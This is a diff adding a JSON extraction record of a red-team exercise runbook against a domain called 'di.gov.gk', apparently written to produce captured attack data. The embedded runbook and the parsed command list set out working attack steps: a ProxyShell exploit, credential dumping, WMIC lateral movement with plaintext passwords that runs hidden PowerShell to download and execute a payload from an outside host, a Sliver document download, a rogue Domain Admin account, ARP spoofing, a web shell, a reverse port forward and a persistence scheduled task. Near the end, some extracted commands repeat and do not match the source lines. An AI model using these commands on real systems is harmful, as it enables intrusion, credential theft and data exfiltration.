@@ -1,0 +1,1418 @@
+{
+  "meta_narrative": {
+    "meta_narrative": "A technical document containing 9 IP addresses and 10 credentials.",
+    "ip_addresses": [
+      "151.102.64.5",
+      "151.102.64.6",
+      "151.102.64.8",
+      "151.102.65.1",
+      "151.102.65.142",
+      "151.102.65.143",
+      "151.102.65.144",
+      "151.102.65.57",
+      "31.148.54.96"
+    ],
+    "credentials": [
+      {
+        "username": "DI\\Administrator",
+        "password": "P@ssw0rd",
+        "type": "wmic",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "DI\\rodrigo.allison",
+        "password": "r4#Sw5GyL+5V",
+        "type": "wmic",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "DI\\shelia.serrano",
+        "password": "xI#Yp6@4#8o#",
+        "type": "wmic",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "DI\\eduardo.wheeler",
+        "password": "bL+6oA6P@W+x",
+        "type": "wmic",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "Administrator",
+        "password": null,
+        "type": "ssh",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "fannie.sparks",
+        "password": null,
+        "type": "ssh",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "cisco",
+        "password": null,
+        "type": "ssh",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "oliver.jones",
+        "password": "1R34llyL0v3P1zz4!",
+        "type": "powershell",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "Administrator@di.gov.gk",
+        "password": null,
+        "type": "email",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      },
+      {
+        "username": "oliver.jones@di.gov.gk",
+        "password": null,
+        "type": "email",
+        "source": "regex",
+        "confidence": "high",
+        "found_by": "regex_only"
+      }
+    ],
+    "statistics": {
+      "total_ips": 9,
+      "total_credentials": 10,
+      "document_length_chars": 5509,
+      "document_length_lines": 109,
+      "processing_time_seconds": 21.06
+    }
+  },
+  "segments": {
+    "segments": [
+      {
+        "id": 1,
+        "title": "Complete Document",
+        "start_line": 1,
+        "end_line": 109,
+        "content": "Initial Access\n-\tUdg-kali-1 terminal\nmsfconsole\nmsf> use exploit/windows/http/exchange_proxyshell_rce\nmsf> set RHOSTS 151.102.64.6\nmsf> set EMAIL Administrator@di.gov.gk\nmsf> set payload windows/x64/meterpreter/bind_tcp\n## 3.3.10 Initial Access capture start \nmsf> run\nmeterpreter > cd C:\\\\Users\\\\Administrator\\\\Documents\nmeterpreter > upload /home/user/Desktop/AWSAuthService.exe C:\\\\Users\\\\Administrator\\\\Documents\\\\AWSAuthService.exe\nmeterpreter > execute -f “C:\\\\Users\\\\Administrator\\\\Documents\\\\AWSAuthService.exe”\nmeterpreter > exit\n## 3.3.10 Initial Access capture stop\nDiscovery\n-\tUdg-kali-1 terminal in cobalt strike ui\n## 3.3.11(situational awareness) capture starts \no\tInteract with DI-EX beacon\nshell ipconfig /all\nlogonpasswords\nnet domain_controllers\n## 3.3.11(situational awareness) capture stop\n-\tRogue Kali Machine with Reverse SSH setup is used for internal attacker tools.\n-\tUdg-kali-1 terminal\nSsh -p 2222 Administrator@localhost\n## 3.3.5 mitm capture start \nSudo ~/Responder/Responder.py -I ens33 -Pv\n•\tRuns until fannie.sparks hash is shown\n## 3.3.5 mitm capture stop\nLateral Movement\n## 3.3.11(Lateral Movement) capture start\n-\tUdg-kali-1 terminal in cobalt strike ui\no\tInteract with DI-EX beacon\nShell wmic /node:”151.102.64.5”  /user:”DI\\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe’; Start-Process 'C:\\Windows\\AWSAuthService.exe’\\\"\"\no\tInteract with DI-DC beacon\nlogonpasswords\nnet computers\nShell wmic /node:”151.102.65.144”  /user:”DI\\rodrigo.allison” /password:”r4#Sw5GyL+5V” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe’; Start-Process 'C:\\Windows\\AWSAuthService.exe’\\\"\"\nShell wmic /node:”151.102.65.142”  /user:”DI\\shelia.serrano” /password:”xI#Yp6@4#8o#” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe’; Start-Process 'C:\\Windows\\AWSAuthService.exe’\\\"\"\nShell wmic /node:”151.102.65.57”  /user:”DI\\eduardo.wheeler” /password:”bL+6oA6P@W+x” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe’; Start-Process 'C:\\Windows\\AWSAuthService.exe’\\\"\"\nShell wmic /node:”151.102.64.8”  /user:”DI\\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe’; Start-Process 'C:\\Windows\\AWSAuthService.exe’\\\"\"\n## 3.3.11(Lateral Movement) capture stop\nssh -p 2222 Administrator@localhost\nsudo nmap -sV -O 151.102.65.143\n## 3.3.11 Mounted Shares Capture Start\nssh fannie.sparks@151.102.65.143\nnet use S: \\\\31.148.54.96\\Share\ncopy S:\\* C:\\Windows\\System32\\\n## 3.3.11 Mounted Shares Capture Stop\n## 3.3.7 & 3.3.8 DNS Beacon Capture Start\nC:\\Windows\\System32\\SymantecSysMonitor.exe\n\tIn sliver beacon\nsliver > use\nsliver > cd C:\\\\Users\\\\fannie.sparks\\\\Documents\nsliver > ls\nsliver > download GK_DEFINTEL_ProjectHelios_TechOverview.docx\n\n## 3.3.7 & 3.3.8 DNS Beacon Capture Stop (let run for a while to show max beacons)\n\tBack in ssh session\nnltest /DCLIST:DI\nnslookup di-dc.di.gov.gk\n-\tNew UDG-kali-1 terminal\nSsh -p 2222 Administrator@localhost\nSsh fannie.sparks@151.102.64.5\npowershell\nNew-ADUser -Name \"Oliver Jones\" -GivenName \"Oliver\" -Surname \"Jones\" -SamAccountName \"oliver.jones\" -UserPrincipalName \"oliver.jones@di.gov.gk\" -AccountPassword (ConvertTo-SecureString \"1R34llyL0v3P1zz4!\" -AsPlainText -Force) -Enabled $true\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"oliver.jones\"\nexit\nexit\n\n## 3.3.6 Arp Spoofing Capture Start\ncd ~/Arp-Spoofer\nsudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1\ny\n\t( to see traffic create another ssh session and use tcpdump)\n## 3.3.6 Arp Spoofing Capture Stop (let run a while)\nPersistence\n## 3.3.12 (Persistence) Capture Start\n-\tUdg-kali-1 terminal in cobalt strike ui\no\tInteract with DI-WEB beacon\ncd C:\\inetpub\\wwwroot\\aspnet_client\nupload /home/user/util.aspx\n(The web shell can be interacted with by using browser urls such as “151.102.64.8/aspnet_client/util.aspx?cmd=%22net%20localgroup%20administrators%22” )\n## 3.3.11 (Persistence) Capture Stop\n## 3.3.14 open port capture start\n-\tUdg-kali-1 terminal in cobalt strike ui\no\tInteract with DI-W10-3 beacon\nrportfwd 443 31.148.54.96 6666\n## 3.3.14 open port capture stop\nNetwork Device Attack\n-\tUdg-kali-1\no\tIn terminal\ncd /home/user/sshbrutesim\npython3 -m http.server 8080\no\tInteract with DI-W11-5 beacon\nupload /home/user/run_brute.ps1\nshell powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute.ps1\no\t Interact with DI-W10-5  beacon\nSocks 9050 socks5\no\tIn UDG Kali 1 Terminal\nproxychains ssh cisco@151.102.65.1 (need to check proxychains4.conf)\nconf t\nip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443\nend\nAnomalous Malicious Activity\nUpload clrhost.ps1 to DI-W10-3, DI-W10-5, and DI-W11-5 using CS:\nUpload /home/user/clrhost.ps1\nShell schtasks /create /tn \"Microsoft CLR Monitor\" /tr \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\system32\\clrhost.ps1\" /sc onlogon /rl HIGHEST\n",
+        "rationale": "Segmentation failed, using entire document",
+        "segmentation_strategy": "Fallback strategy due to error"
+      }
+    ],
+    "statistics": {
+      "total_segments": 1,
+      "processing_time_seconds": 5.55
+    }
+  },
+  "extractions": {
+    "ip_credentials": {
+      "ip_addresses": {
+        "all_ips": [
+          "151.102.64.5",
+          "151.102.64.6",
+          "151.102.64.8",
+          "151.102.65.1",
+          "151.102.65.142",
+          "151.102.65.143",
+          "151.102.65.144",
+          "151.102.65.57",
+          "31.148.54.96"
+        ],
+        "provenance": {
+          "both": [],
+          "regex_only": [
+            "151.102.64.5",
+            "151.102.64.6",
+            "151.102.64.8",
+            "151.102.65.1",
+            "151.102.65.142",
+            "151.102.65.143",
+            "151.102.65.144",
+            "151.102.65.57",
+            "31.148.54.96"
+          ],
+          "llm_only": []
+        }
+      },
+      "credentials": {
+        "all_credentials": [
+          {
+            "username": "Administrator",
+            "password": null,
+            "type": "ssh",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "Administrator@di.gov.gk",
+            "password": null,
+            "type": "email",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "cisco",
+            "password": null,
+            "type": "ssh",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "DI\\Administrator",
+            "password": "P@ssw0rd",
+            "type": "wmic",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "DI\\eduardo.wheeler",
+            "password": "bL+6oA6P@W+x",
+            "type": "wmic",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "DI\\rodrigo.allison",
+            "password": "r4#Sw5GyL+5V",
+            "type": "wmic",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "DI\\shelia.serrano",
+            "password": "xI#Yp6@4#8o#",
+            "type": "wmic",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "fannie.sparks",
+            "password": null,
+            "type": "ssh",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "oliver.jones",
+            "password": "1R34llyL0v3P1zz4!",
+            "type": "powershell",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          },
+          {
+            "username": "oliver.jones@di.gov.gk",
+            "password": null,
+            "type": "email",
+            "source": "regex",
+            "confidence": "high",
+            "found_by": "regex_only"
+          }
+        ],
+        "provenance": {
+          "both": [],
+          "regex_only": [
+            {
+              "username": "Administrator",
+              "password": null,
+              "type": "ssh",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "Administrator@di.gov.gk",
+              "password": null,
+              "type": "email",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "cisco",
+              "password": null,
+              "type": "ssh",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "DI\\Administrator",
+              "password": "P@ssw0rd",
+              "type": "wmic",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "DI\\eduardo.wheeler",
+              "password": "bL+6oA6P@W+x",
+              "type": "wmic",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "DI\\rodrigo.allison",
+              "password": "r4#Sw5GyL+5V",
+              "type": "wmic",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "DI\\shelia.serrano",
+              "password": "xI#Yp6@4#8o#",
+              "type": "wmic",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "fannie.sparks",
+              "password": null,
+              "type": "ssh",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "oliver.jones",
+              "password": "1R34llyL0v3P1zz4!",
+              "type": "powershell",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            },
+            {
+              "username": "oliver.jones@di.gov.gk",
+              "password": null,
+              "type": "email",
+              "source": "regex",
+              "confidence": "high",
+              "found_by": "regex_only"
+            }
+          ],
+          "llm_only": []
+        }
+      },
+      "statistics": {
+        "total_ips": 9,
+        "total_credentials": 10,
+        "processing_time_seconds": 0.0
+      }
+    },
+    "commands": [
+      {
+        "segment_id": 1,
+        "segment_title": "Complete Document",
+        "commands": [
+          {
+            "command": "msfconsole",
+            "tool_context": "metasploit",
+            "target": "",
+            "parameters": {},
+            "line_number": "1",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "use exploit/windows/http/exchange_proxyshell_rce",
+            "tool_context": "metasploit",
+            "target": "",
+            "parameters": {
+              "module": "exploit/windows/http/exchange_proxyshell_rce"
+            },
+            "line_number": "2",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "set RHOSTS 151.102.64.6",
+            "tool_context": "metasploit",
+            "target": "151.102.64.6",
+            "parameters": {
+              "RHOSTS": "151.102.64.6"
+            },
+            "line_number": "3",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "set EMAIL Administrator@di.gov.gk",
+            "tool_context": "metasploit",
+            "target": "",
+            "parameters": {
+              "EMAIL": "Administrator@di.gov.gk"
+            },
+            "line_number": "4",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "set payload windows/x64/meterpreter/bind_tcp",
+            "tool_context": "metasploit",
+            "target": "",
+            "parameters": {
+              "payload": "windows/x64/meterpreter/bind_tcp"
+            },
+            "line_number": "5",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "run",
+            "tool_context": "metasploit",
+            "target": "",
+            "parameters": {},
+            "line_number": "6",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "cd C:\\Users\\Administrator\\Documents",
+            "tool_context": "meterpreter",
+            "target": "",
+            "parameters": {
+              "path": "C:\\Users\\Administrator\\Documents"
+            },
+            "line_number": "7",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/Desktop/AWSAuthService.exe C:\\Users\\Administrator\\Documents\\AWSAuthService.exe",
+            "tool_context": "meterpreter",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/Desktop/AWSAuthService.exe",
+              "destination": "C:\\Users\\Administrator\\Documents\\AWSAuthService.exe"
+            },
+            "line_number": "8",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "execute -f “C:\\Users\\Administrator\\Documents\\AWSAuthService.exe”",
+            "tool_context": "meterpreter",
+            "target": "",
+            "parameters": {
+              "-f": "C:\\Users\\Administrator\\Documents\\AWSAuthService.exe"
+            },
+            "line_number": "9",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "exit",
+            "tool_context": "meterpreter",
+            "target": "",
+            "parameters": {},
+            "line_number": "10",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "shell ipconfig /all",
+            "tool_context": "cobalt strike shell",
+            "target": "",
+            "parameters": {
+              "command": "ipconfig /all"
+            },
+            "line_number": "11",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "logonpasswords",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {},
+            "line_number": "12",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "net domain_controllers",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {},
+            "line_number": "13",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "ssh -p 2222 Administrator@localhost",
+            "tool_context": "ssh",
+            "target": "localhost",
+            "parameters": {
+              "-p": "2222",
+              "user": "Administrator"
+            },
+            "line_number": "14",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sudo ~/Responder/Responder.py -I ens33 -Pv",
+            "tool_context": "bash (sudo)",
+            "target": "",
+            "parameters": {
+              "-I": "ens33",
+              "-Pv": ""
+            },
+            "line_number": "15",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Shell wmic /node:\"151.102.64.5\" /user:\"DI\\Administrator\" /password:\"P@ssw0rd\" process call create \"cmd.exe /c powershell -nop -w hidden -c \\\"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\\\"\"",
+            "tool_context": "wmic",
+            "target": "151.102.64.5",
+            "parameters": {
+              "/node": "151.102.64.5",
+              "/user": "DI\\Administrator",
+              "/password": "P@ssw0rd",
+              "process call create": "cmd.exe /c powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\""
+            },
+            "line_number": "16",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "logonpasswords",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {},
+            "line_number": "17",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "net computers",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {},
+            "line_number": "18",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Shell wmic /node:\"151.102.65.144\" /user:\"DI\\rodrigo.allison\" /password:\"r4#Sw5GyL+5V\" process call create \"cmd.exe /c powershell -nop -w hidden -c \\\"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\\\"\"",
+            "tool_context": "wmic",
+            "target": "151.102.65.144",
+            "parameters": {
+              "/node": "151.102.65.144",
+              "/user": "DI\\rodrigo.allison",
+              "/password": "r4#Sw5GyL+5V",
+              "process call create": "cmd.exe /c powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\""
+            },
+            "line_number": "19",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Shell wmic /node:\"151.102.65.142\" /user:\"DI\\shelia.serrano\" /password:\"xI#Yp6@4#8o#\" process call create \"cmd.exe /c powershell -nop -w hidden -c \\\"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\\\"\"",
+            "tool_context": "wmic",
+            "target": "151.102.65.142",
+            "parameters": {
+              "/node": "151.102.65.142",
+              "/user": "DI\\shelia.serrano",
+              "/password": "xI#Yp6@4#8o#",
+              "process call create": "cmd.exe /c powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\""
+            },
+            "line_number": "20",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Shell wmic /node:\"151.102.65.57\" /user:\"DI\\eduardo.wheeler\" /password:\"bL+6oA6P@W+x\" process call create \"cmd.exe /c powershell -nop -w hidden -c \\\"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\\\"\"",
+            "tool_context": "wmic",
+            "target": "151.102.65.57",
+            "parameters": {
+              "/node": "151.102.65.57",
+              "/user": "DI\\eduardo.wheeler",
+              "/password": "bL+6oA6P@W+x",
+              "process call create": "cmd.exe /c powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\""
+            },
+            "line_number": "21",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Shell wmic /node:\"151.102.64.8\" /user:\"DI\\Administrator\" /password:\"P@ssw0rd\" process call create \"cmd.exe /c powershell -nop -w hidden -c \\\"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\\\"\"",
+            "tool_context": "wmic",
+            "target": "151.102.64.8",
+            "parameters": {
+              "/node": "151.102.64.8",
+              "/user": "DI\\Administrator",
+              "/password": "P@ssw0rd",
+              "process call create": "cmd.exe /c powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\\Windows\\AWSAuthService.exe'; Start-Process 'C:\\Windows\\AWSAuthService.exe'\""
+            },
+            "line_number": "22",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "ssh -p 2222 Administrator@localhost",
+            "tool_context": "ssh",
+            "target": "localhost",
+            "parameters": {
+              "-p": "2222",
+              "user": "Administrator"
+            },
+            "line_number": "23",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sudo nmap -sV -O 151.102.65.143",
+            "tool_context": "nmap (sudo)",
+            "target": "151.102.65.143",
+            "parameters": {
+              "-sV": "",
+              "-O": ""
+            },
+            "line_number": "24",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "ssh fannie.sparks@151.102.65.143",
+            "tool_context": "ssh",
+            "target": "151.102.65.143",
+            "parameters": {
+              "user": "fannie.sparks"
+            },
+            "line_number": "25",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "net use S: \\\\31.148.54.96\\Share",
+            "tool_context": "windows net use",
+            "target": "31.148.54.96",
+            "parameters": {
+              "drive": "S:",
+              "share": "\\\\31.148.54.96\\Share"
+            },
+            "line_number": "26",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "copy S:\\* C:\\Windows\\System32\\",
+            "tool_context": "windows copy",
+            "target": "",
+            "parameters": {
+              "source": "S:\\*",
+              "destination": "C:\\Windows\\System32\\"
+            },
+            "line_number": "27",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "C:\\Windows\\System32\\SymantecSysMonitor.exe",
+            "tool_context": "windows executable",
+            "target": "",
+            "parameters": {},
+            "line_number": "28",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sliver > use",
+            "tool_context": "sliver",
+            "target": "",
+            "parameters": {
+              "command": "use"
+            },
+            "line_number": "29",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sliver > cd C:\\Users\\fannie.sparks\\Documents",
+            "tool_context": "sliver",
+            "target": "",
+            "parameters": {
+              "path": "C:\\Users\\fannie.sparks\\Documents"
+            },
+            "line_number": "30",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sliver > ls",
+            "tool_context": "sliver",
+            "target": "",
+            "parameters": {},
+            "line_number": "31",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sliver > download GK_DEFINTEL_ProjectHelios_TechOverview.docx",
+            "tool_context": "sliver",
+            "target": "",
+            "parameters": {
+              "file": "GK_DEFINTEL_ProjectHelios_TechOverview.docx"
+            },
+            "line_number": "32",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "nltest /DCLIST:DI",
+            "tool_context": "windows nltest",
+            "target": "",
+            "parameters": {
+              "/DCLIST": "DI"
+            },
+            "line_number": "33",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "nslookup di-dc.di.gov.gk",
+            "tool_context": "nslookup",
+            "target": "di-dc.di.gov.gk",
+            "parameters": {},
+            "line_number": "34",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "ssh -p 2222 Administrator@localhost",
+            "tool_context": "ssh",
+            "target": "localhost",
+            "parameters": {
+              "-p": "2222",
+              "user": "Administrator"
+            },
+            "line_number": "35",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "ssh fannie.sparks@151.102.64.5",
+            "tool_context": "ssh",
+            "target": "151.102.64.5",
+            "parameters": {
+              "user": "fannie.sparks"
+            },
+            "line_number": "36",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "powershell",
+            "tool_context": "powershell",
+            "target": "",
+            "parameters": {},
+            "line_number": "37",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "New-ADUser -Name \"Oliver Jones\" -GivenName \"Oliver\" -Surname \"Jones\" -SamAccountName \"oliver.jones\" -UserPrincipalName \"oliver.jones@di.gov.gk\" -AccountPassword (ConvertTo-SecureString \"1R34llyL0v3P1zz4!\" -AsPlainText -Force) -Enabled $true",
+            "tool_context": "powershell (ActiveDirectory)",
+            "target": "di.gov.gk",
+            "parameters": {
+              "-Name": "Oliver Jones",
+              "-GivenName": "Oliver",
+              "-Surname": "Jones",
+              "-SamAccountName": "oliver.jones",
+              "-UserPrincipalName": "oliver.jones@di.gov.gk",
+              "-AccountPassword": "ConvertTo-SecureString \"1R34llyL0v3P1zz4!\" -AsPlainText -Force",
+              "-Enabled": "$true"
+            },
+            "line_number": "38",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"oliver.jones\"",
+            "tool_context": "powershell (ActiveDirectory)",
+            "target": "",
+            "parameters": {
+              "-Identity": "Domain Admins",
+              "-Members": "oliver.jones"
+            },
+            "line_number": "39",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "exit",
+            "tool_context": "powershell",
+            "target": "",
+            "parameters": {},
+            "line_number": "40",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "exit",
+            "tool_context": "ssh",
+            "target": "",
+            "parameters": {},
+            "line_number": "41",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "cd ~/Arp-Spoofer",
+            "tool_context": "bash",
+            "target": "",
+            "parameters": {
+              "path": "~/Arp-Spoofer"
+            },
+            "line_number": "42",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "sudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1",
+            "tool_context": "bash (sudo)",
+            "target": "151.102.65.1",
+            "parameters": {
+              "-i": "ens33",
+              "-f": "151.102.65.1"
+            },
+            "line_number": "43",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "cd C:\\inetpub\\wwwroot\\aspnet_client",
+            "tool_context": "windows cmd",
+            "target": "",
+            "parameters": {
+              "path": "C:\\inetpub\\wwwroot\\aspnet_client"
+            },
+            "line_number": "45",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "46",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "rportfwd 443 31.148.54.96 6666",
+            "tool_context": "cobalt strike",
+            "target": "31.148.54.96",
+            "parameters": {
+              "local_port": "443",
+              "remote_port": "6666"
+            },
+            "line_number": "48",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "cd /home/user/sshbrutesim",
+            "tool_context": "bash",
+            "target": "",
+            "parameters": {
+              "path": "/home/user/sshbrutesim"
+            },
+            "line_number": "49",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "python3 -m http.server 8080",
+            "tool_context": "bash (python)",
+            "target": "",
+            "parameters": {
+              "port": "8080"
+            },
+            "line_number": "50",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "52",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "53",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "54",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "cd /home/user/sshbrutesim",
+            "tool_context": "bash",
+            "target": "",
+            "parameters": {
+              "path": "/home/user/sshbrutesim"
+            },
+            "line_number": "55",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "56",
